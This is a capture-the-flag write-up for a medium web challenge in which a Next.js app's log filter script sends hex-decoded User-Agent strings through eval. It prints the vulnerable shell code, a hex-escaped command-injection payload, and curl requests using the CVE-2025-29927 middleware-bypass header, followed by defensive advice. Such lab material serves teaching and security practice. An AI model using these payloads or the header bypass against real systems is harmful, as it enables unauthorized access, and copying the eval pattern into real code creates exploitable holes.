# COMMAND INJECTION IN THE LOGS

## AISEC ENSA MARRAKECH CTF 2025
**Challenge Creator**: hmidal3yan | **Difficulty**: Medium | **Category**: Web Exploitation

---

## TARGET OVERVIEW

This Next.js application records user interactions in log files. The critical vulnerability exists in how the system processes the `User-Agent` field in the `contact.log` file - specifically, an unsafe `eval` command that gives us our foothold.

### System Constraints:
- The filter script runs with limited user privileges (`filteruser`)
- Available commands are restricted to those in `/restricted/bin`
- Flag requires activation via the `flag` command before retrieval
- Flag is only accessible for 2 minutes after activation
- Special cookie required to access the flag endpoint

## ATTACK SURFACE

The application exposes several attack vectors:

```
┌─────────────────┐       ┌──────────────┐       ┌───────────────┐
│                 │       │              │       │               │
│  Contact Form   │──────▶│  Log Files   │──────▶│ Filter Script │
│  /api/contact   │       │ contact.log  │       │ (vulnerable)  │
│                 │       │              │       │               │
└─────────────────┘       └──────────────┘       └───────────────┘
                                                         │
                                                         │
                                                         ▼
┌─────────────────┐       ┌──────────────┐       ┌───────────────┐
│                 │       │              │       │               │
│  Flag Endpoint  │◀──────│ Flag Checker │◀──────│ Filtered Logs │
│ /api/i7tiramati │       │              │       │               │
│                 │       └──────────────┘       └───────────────┘
└─────────────────┘
```

### Key API Endpoints:
- **POST /api/contact**: Logs User-Agent to `contact.log` (our injection point)
- **GET /api/logs**: Retrieves processed logs from `logs/filtered`
- **GET /api/i7tiramati**: Returns the flag (requires authentication + activation)

## CRITICAL VULNERABILITY

The filter script processes log entries with a dangerous pattern:

```bash
# Vulnerable code in filter.sh
sanitized=$(echo "$user_agent" | sed 's/[;&|`$()]//g')
decoded=$(printf '%b' "$sanitized")
processed=$(eval "echo \"$decoded\"")
```

This unsafe `eval` is badly sanitized and allows use to use Hexa to bypass the sanitization and execute arbitrary commands when our payload is processed by the filter script.

## EXPLOITATION WALKTHROUGH

### PHASE 1: RECONNAISSANCE
1. Examine the application structure
2. Identify the vulnerable log processing mechanism
3. Understand the flag activation requirements

### PHASE 2: PAYLOAD CRAFTING
We need to:
- Inject a command that executes the `flag` command
- Obtain the special cookie by using `\x24\x28flag\x29` as our User-Agent
- Prepare for accessing the flag endpoint

### PHASE 3: EXPLOITATION
1. Submit a contact form with our crafted User-Agent payload
2. Wait for the filter script to process our payload (runs every 3 minutes)
3. Confirm flag activation (writes "1" to `/tmp/.flag_activated`)
4. Access `/api/i7tiramati` with the acquired cookie

## EXPLOITATION TOOLS

```bash
# Crafting payload with curl
curl -X POST http://target:3000/api/contact \
  -H "Content-Type: application/json" \
  -H "User-Agent: \x24\x28flag\x29" \
  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware" \
  -d '{"name":"hacker","email":"exploit@test.com","message":222 /to cause ERROR/}'
THAT IS THE PAYLOAD STRUCTURE BUT IT IS BETTER TO USE POSTMAN OR BURPSUITE so you capture the cookie returned to the user.
# Retrieving flag
curl -X GET http://target:3000/api/i7tiramati \
      -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware" \
      -H "Cookie: special_cookie=value_from_response"
```

## REAL-WORLD CONNECTIONS

This challenge draws inspiration from CVE-2025-29927, a Next.js middleware bypass vulnerability where attackers could bypass authentication by adding a specific header:

```
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware
```

While our challenge focuses on command injection rather than middleware bypass, both exploits demonstrate how HTTP headers can be weaponized to compromise application security.

## DEFENSE STRATEGIES

To prevent this type of vulnerability:
- Never use `eval` with untrusted input
- Implement strict input validation for all user-controllable fields
- Use proper shell escaping when processing log entries
- Run processing scripts with minimal privileges
- Implement proper authentication for sensitive endpoints


**Challenge completed! Add this to your collection of pwned systems.**
